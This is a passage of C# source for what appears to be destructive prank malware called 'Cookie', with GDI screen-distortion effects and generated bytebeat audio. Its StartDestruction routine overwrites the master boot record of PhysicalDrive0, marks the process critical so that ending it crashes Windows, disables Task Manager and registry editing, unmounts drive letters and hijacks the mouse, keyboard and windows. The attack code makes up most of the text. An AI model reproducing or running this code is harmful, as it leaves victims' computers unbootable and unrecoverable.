        private int moveStepX = 1;
        private int moveStepY = 1;
        public override void Draw(IntPtr hdc)
        {
            Random r = new Random();
            int x = screenW;
            int y = screenH;
            Cursor.Position = new Point(ballPosX, ballPosY);
            ballPosX += moveStepX;
            if (
                ballPosX < 0 ||
                ballPosX + ballWidth > screenW
                )
            {
                moveStepX = -moveStepX;
            }

            ballPosY += moveStepY;
            if (
                ballPosY < 0 ||
                ballPosY + ballHeight > screenH
                )
            {
                moveStepY = -moveStepY;
            }
            if (redrawCounter >= 360) { redrawCounter = 0; }
            if (codcod >= 360) { codcod = 0; }
        }
    }

    [DllImport("user32.dll")]
    static extern bool SetWindowText(IntPtr hWnd, string text);
    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();
    private class Windowtext : PayloadGDI
    {
        private int redrawCounter;
        //hi if you use a decompiler: hi
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Process myProcess = new Process();
                Process[] processes = Process.GetProcesses();

                foreach (var process in processes)
                {

                    Console.WriteLine("Process Name: {0} ", process.ProcessName);

                    IntPtr handle = process.MainWindowHandle;
                    if (handle != IntPtr.Zero)
                    {
                        Random r = new Random();
                        SetWindowText(process.MainWindowHandle, "Cookie Calls You A Bad Boi");
                        Thread.Sleep(100);
                    }
                }
            }
            catch { }
        }
    }

    private class Type : PayloadGDI
    {
        private int redrawCounter;
        //hi if you use a decompiler: hi
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Random r = new Random();
                var chars = "Very Bad Boi ";
                var stringChars = new char[1];
                var random = new Random();

                for (int i = 0; i < stringChars.Length; i++)
                {
                    stringChars[i] = chars[random.Next(chars.Length)];
                }
                var finalString = new String(stringChars);

                SendKeys.SendWait(finalString);
                Thread.Sleep(r.Next(10, 10000));
            }
            catch { }
        }
    }

    [DllImport("user32.dll", SetLastError = true)]
    internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

    private class Window : PayloadGDI
    {
        private int redrawCounter;
        public override void Draw(IntPtr hdc)
        {
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    Console.WriteLine("Process Name: {0} ", process.ProcessName);
                    IntPtr handle = process.MainWindowHandle;

                    if (handle != IntPtr.Zero)
                    {
                        Random random = new Random();
                        MoveWindow(GetForegroundWindow(), random.Next(1, screenW), random.Next(1, screenH), random.Next(1, screenW), random.Next(1, screenH), true);
                        MoveWindow(handle, random.Next(1, screenW), random.Next(1, screenH), random.Next(1, screenW), random.Next(1, screenH), true);
                        MoveWindow(process.Handle, random.Next(1, screenW), random.Next(1, screenH), random.Next(1, screenW), random.Next(1, screenH), true);

                    }
                }
                catch { }
            }
        }
    }



    // Special gdi paylioads class
    private abstract class PayloadGDI
    {
        public bool running;
        public Random random = new Random();
        public int screenW = Screen.PrimaryScreen.Bounds.Width;
        public int screenH = Screen.PrimaryScreen.Bounds.Height;

        public void Start()
        {
            if (!running)
            {
                running = true;
                new Thread(DrawLoop).Start();
            }
        }

        public void Stop()
        {
            running = false;
        }

        private void DrawLoop()
        {
            while (running)
            {
                IntPtr dC = GetDC(IntPtr.Zero);
                Draw(dC);
                ReleaseDC(IntPtr.Zero, dC);
            }
        }

        public void Redraw()
        {
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
        }

        public abstract void Draw(IntPtr hdc);
    }

    [Flags]
    private enum RedrawWindowFlags : uint
    {
        Invalidate = 1u,
        InternalPaint = 2u,
        Erase = 4u,
        Validate = 8u,
        NoInternalPaint = 0x10u,
        NoErase = 0x20u,
        NoChildren = 0x40u,
        AllChildren = 0x80u,
        UpdateNow = 0x100u,
        EraseNow = 0x200u,
        Frame = 0x400u,
        NoFrame = 0x800u
    }

    // then Bytebeetz

    private static void by1(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * (0x21CA52CA >> (t >> 9 & 30) & 14) + t * (0xCACACACA >> (t >> 9 & 30) & 14) & t >> 4
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    // i made this one
    private static void by2(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 11025;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * t >> 8 | t >> t * t >> 4 | t >> t * t >> 2
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by3(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 16000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    3 * t ^ t >> 6 | t
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by4(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 48000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * t % (55 * 0xCADE11)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by5(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t * t >> 1 * (t >> 8)) | (t * t >> (t >> 6)) & (t * t >> 7)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by6(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * t >> (t >> (t & 8) | t << (t & 85) | t >> 6 | t << 8)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by7(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t >> (t >> 12) % 4) + t * (1 + (1 + (t >> 16) % 6) * (t >> 10) * (t >> 11) % 8) ^ t >> 13 ^ t >> 6
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by8(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    43 * (t >> 41 | t >> 2)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by9(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    9 * (t * ((t >> 9 | t >> 13) & 15) & 16)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by10(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    20 * t * t * (t >> 11) / 7
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    public static void mbr()
    {
        var mbrData = new byte[] {
0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x04, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
0x10, 0xEB, 0xF5, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x50, 0x43, 0x20, 0x69, 0x73, 0x20, 0x6E,
0x6F, 0x77, 0x20, 0x61, 0x73, 0x20, 0x75, 0x73, 0x65, 0x6C, 0x65, 0x73, 0x73, 0x20, 0x61, 0x73,
0x20, 0x61, 0x20, 0x43, 0x6F, 0x6F, 0x6B, 0x69, 0x65, 0x21, 0x0D, 0x0A, 0x4D, 0x69, 0x67, 0x68,
0x74, 0x20, 0x61, 0x73, 0x77, 0x65, 0x6C, 0x6C, 0x20, 0x65, 0x61, 0x74, 0x20, 0x69, 0x74, 0x2E,
0x20, 0x49, 0x66, 0x20, 0x49, 0x20, 0x77, 0x65, 0x72, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x2C, 0x20,
0x49, 0x20, 0x77, 0x6F, 0x75, 0x6C, 0x64, 0x20, 0x65, 0x61, 0x74, 0x20, 0x69, 0x74, 0x0D, 0x0A,
0x43, 0x6F, 0x64, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x45, 0x6D, 0x6D, 0x79, 0x4D, 0x61, 0x6C,
0x77, 0x61, 0x72, 0x65, 0x20, 0x69, 0x6E, 0x20, 0x43, 0x23, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x41,
0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x4D, 0x42, 0x52, 0x21,
0x0D, 0x0A, 0x41, 0x6C, 0x73, 0x6F, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x61, 0x6E, 0x6E,
0x6F, 0x74, 0x20, 0x72, 0x65, 0x63, 0x6F, 0x76, 0x65, 0x72, 0x20, 0x74, 0x68, 0x65, 0x20, 0x50,
0x43, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x20, 0x6E, 0x6F, 0x72, 0x6D, 0x61, 0x6C, 0x2C, 0x20, 0x62,
0x65, 0x63, 0x61, 0x75, 0x73, 0x65, 0x20, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
0x73, 0x20, 0x69, 0x73, 0x20, 0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x21, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
        var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
        WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
    }

    /// <summary>
    /// Der Haupteinstiegspunkt für die Anwendung.
    /// </summary>
    public static int isCritical = 1;  // we want this to be a Critical Process
    public static int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new Form1());
    }

    public static void StartDestruction()
    {
        SoundPlayer sss = new SoundPlayer(Resources.Kitsune2_rock_my_emotions); // i luv kitsune2
        PayloadGDI bb1 = new bb1();
        PayloadGDI bb2 = new bb2();
        PayloadGDI bb3 = new bb3();
        PayloadGDI bb4 = new bb4();
        PayloadGDI bb5 = new bb5();
        PayloadGDI bb6 = new bb6();
        PayloadGDI payload1 = new payload1();
        PayloadGDI payload2 = new payload2();
        PayloadGDI payload3 = new payload3();
        PayloadGDI payload4 = new payload4();
        PayloadGDI payload5 = new payload5();
        PayloadGDI payload6 = new payload6();
        PayloadGDI payload7 = new payload7();
        PayloadGDI payload8 = new payload8();
        PayloadGDI payload9 = new payload9();
        PayloadGDI payload10 = new payload10();
        PayloadGDI payload11 = new payload11();
        PayloadGDI payload12 = new payload12();
        PayloadGDI cur = new cur();
        PayloadGDI type = new Type();
        PayloadGDI windowtext = new Windowtext();
        PayloadGDI window = new Window();
        if (MessageBox.Show("Are you Sure, " + Environment.UserName, "Cookie", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
        {
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            mbr();
            Thread.Sleep(5000);
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            Process.Start("mspaint");
            Process.Start("cmd");
            Process.Start("msconfig");
            Process.Start("sol");
            Process.Start("calc");
            Process.Start("explorer.exe");
            Process.Start("services.msc");
            Process.Start("devmgmt.msc");
            Process.Start("mmc");
            Process.Start("diskmgmt.msc");
            Process.Start("notepad");
            Process.Start("mstsc");
            cur.Start();
            windowtext.Start();
            type.Start();
            window.Start();
            payload1.Start();
            payload2.Start();
            by1(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload1.Stop();
            payload2.Stop();
            payload3.Start();
            payload4.Start();
            by2(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload3.Stop();
            payload4.Stop();
            payload5.Stop();
            payload6.Start();
            by3(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload6.Stop();
            payload1.Start();
            payload3.Start();
            payload2.Start();
            by4(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload1.Stop();
            payload3.Stop();
            payload2.Stop();
            payload7.Stop();
            payload7.Start();
            payload1.Start();
            by5(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload7.Stop();
            payload1.Stop();
            payload8.Start();
            payload6.Start();
            by6(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload8.Stop();
            payload6.Stop();
            payload9.Start();
            payload4.Start();
            payload7.Start();
            by7(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload9.Stop();
            payload4.Stop();
            payload7.Stop();
            payload10.Start();
            payload2.Start();
            by8(30);
            cmd.ExecuteCommand("mountvol a: /d", false);
            cmd.ExecuteCommand("mountvol b: /d", false);
            cmd.ExecuteCommand("mountvol c: /d", false);
            cmd.ExecuteCommand("mountvol d: /d", false);
            cmd.ExecuteCommand("mountvol e: /d", false);
            cmd.ExecuteCommand("mountvol z: /d", false);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload10.Stop();
            payload2.Stop();
            payload11.Start();
            payload6.Start();
            by9(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload11.Stop();
            payload6.Stop();
            payload12.Start();
            payload1.Start();
            sss.Play();
            Thread.Sleep(30000);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            sss.Stop();
            payload12.Stop();
            payload1.Stop();
            // THE GRAND FINALE
            payload1.Start();
            payload2.Start();
            payload3.Start();
            payload4.Start();
            payload5.Start();
            payload6.Start();
            payload7.Start();
            payload8.Start();
            payload9.Start();
            payload10.Start();
            payload11.Start();
            payload12.Start();
            by10(30);
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            payload1.Stop();
            payload2.Stop();
            payload3.Stop();
            payload4.Stop();
            payload5.Stop();
            payload6.Stop();
            payload7.Stop();
            payload8.Stop();
            payload9.Stop();
            payload10.Stop();
            payload11.Stop();
            payload12.Stop();
